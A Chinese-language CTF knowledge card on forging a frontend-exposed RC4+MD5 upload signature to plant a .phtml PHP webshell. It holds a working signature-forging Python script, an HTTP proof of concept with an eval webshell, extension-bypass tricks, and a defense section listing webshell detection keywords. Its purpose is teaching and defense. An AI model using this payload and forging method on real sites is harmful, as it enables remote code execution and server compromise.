---
id: web-generic-file-upload-frontend-rc4-md5-signature-forge
title: 前端 RC4+MD5 上传签名伪造：从源码取密钥后上传 phtml webshell
type: scenario
domain: web
path: web/generic/file-upload
technique: frontend-rc4-md5-upload-signature-forge
aliases:
- 上传签名伪造
- RC4+MD5 签名
- 前端密钥泄露
- phtml webshell
- 光能族上传
- 文件上传签名绕过
tags:
- web
- file-upload
- rc4
- md5
- signature
- webshell
- client-side-trust
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V197
  verified_at: '2026-11-06T22:45:04+08:00'
  notes: 已对照原文及图48/54核对：密钥monika creambread、RC4(key,md5(filename))+md5(content)公式经复算得到图54签名8ef1ac...7412c8，逐字节一致；未连接蚁剑复跑。
---

## 一句话结论

上传接口要求 `sig = RC4(SECRET_KEY, md5(filename)) + md5(file_content)`，但密钥与算法写在前端源码中；攻击者复算签名、把文件名改为 `.phtml` 并提交 PHP 内容，即可绕过签名校验上传可执行 webshell，再用蚁剑连接拿 flag。

## 原理

- 服务端用“客户端签名”防篡改，但签名算法/密钥被下发到浏览器：任何访问者都能读取并复算，签名不构成安全边界。
- 本例签名构造：`rc4_bytes = RC4(SECRET_KEY, md5(filename))`，`sig = rc4_bytes.hex() + md5(content)`；服务端用同样密钥/算法校验，校验通过后按扩展名保存。
- 扩展名过滤只挡了常见 `.php`，但允许 `.phtml`（PHP 处理器仍会执行），或可通过大小写/双扩展/`.htaccess` 绕过；上传目录可被 Web 访问且允许执行。
- 一旦 webshell 落地，攻击者用蚁剑/菜刀连接，执行命令读取 flag/主机信息。
- 为什么成立：签名只证明“请求由知道密钥的客户端生成”，而密钥对攻击者公开；真正的安全边界应是服务端会话/权限校验 + 文件类型/内容/存储/执行策略。

## 触发条件

- 上传接口校验客户端计算的签名（RC4/HMAC/MD5 等），算法与密钥在前端 JS/源码中可见。
- 服务端只校验签名，不校验上传者权限/文件内容；扩展名过滤存在可执行后缀（`.phtml`、`.php3`、`.pht` 等）或可被绕过。
- 上传目录位于 Web 根下且允许 PHP 执行。
- 攻击者可访问前端源码（未混淆/未拆包）并复算签名。

## 利用步骤

1. 查看上传页面/前端 JS，定位签名函数与 `SECRET_KEY`（本例 `monika creambread`）、RC4 实现与 MD5 拼接顺序。
2. 选择可执行后缀：`.phtml`（或测试 `.php3/.pht/.phar` 等）。
3. 计算签名：

```python
import hashlib, binascii

def rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256)); j = 0; out = bytearray()
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    for b in data:
        i = (i + 1) % 256; j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(b ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

SECRET = b"monika creambread"
filename = b"1.phtml"
content = "<?php @eval($_POST['shell']);?>"
sig = rc4(SECRET, binascii.unhexlify(hashlib.md5(filename).hexdigest())).hex() + hashlib.md5(content.encode()).hexdigest()
print(sig)
```

4. 构造 multipart 上传：`file=1.phtml`、内容为 webshell、`sign=<sig>`，发送到上传接口。
5. 服务端校验签名通过并保存；访问/连接 `1.phtml`，用蚁剑/curl 执行命令读取 flag。
6. 授权测试中上传仅打印固定字符串的测试文件，测试后删除；不要上传真实后门到生产。

## PoC

```http
POST /upload.php HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="1.phtml"
Content-Type: image/png

<?php @eval($_POST['shell']);?>
------X
Content-Disposition: form-data; name="sign"

<RC4(key, md5(filename)) + md5(content)>
------X--
```

原文前端源码给出 RC4 与 MD5 拼接逻辑，攻击者复算 `sig` 后上传 `1.phtml`，服务端返回保存成功；用蚁剑连接 `1.phtml` 拿到 flag。本卡未在本库复跑；不同实现可能使用 HMAC、SHA-256 或不同的拼接顺序，需要按源码复算。

## 变体与关联

- 签名算法变体：MD5/SHA1/HMAC-SHA256、RSA 签名但私钥被前端持有（等同无效）；签名覆盖字段不同（文件名/内容/时间戳）。
- 后缀变体：`.phtml`、`.php3`、`.pht`、`.phar`、`.inc`、双扩展、大小写、`.htaccess` AddType；结合 `auto_append_file`/`auto_prepend_file` 链（`web-generic-file-upload-htaccess-auto-append-php-filter-base64`）。
- 客户端信任变体：前端加密/签名但密钥硬编码、前端权限判断、前端价格/角色字段；本质都是把安全逻辑放在客户端。
- 关联卡：`web-generic-file-upload-cookie-admin-htaccess-png-race-webshell`；`web-php-rce-htaccess-cgi-addhandler-bypass-disable-functions`；`web-php-file-inclusion-htaccess-auto-prepend-base64-filter`。
- 边界：若服务端同时校验会话角色、内容类型、图片解码并禁用上传目录执行，单纯伪造签名不足以 getshell。

## 检测与防御

- 不信任客户端签名：签名密钥只能保存在服务端；上传权限由服务端会话/角色校验；客户端只做 UX 提示。
- 文件策略：扩展名 allowlist（仅 jpg/png/pdf 等）、MIME/魔数校验、图片重编码、随机文件名、存储到 Web 根外、上传目录禁用脚本执行（Nginx `location ~ \.php$ { deny all; }`、Apache `php_admin_flag engine off`）。
- 内容检测：扫描 webshell 特征（`eval`、`assert`、`base64_decode`、`$_POST`）；对上传文件做隔离/沙箱。
- 监控：上传目录出现可执行后缀、异常 `POST` 到 webshell、蚁剑/菜刀特征流量；对前端源码中的密钥做泄露扫描。
- 响应：删除恶意文件、轮换密钥、排查上传日志与访问日志、评估是否已执行命令。
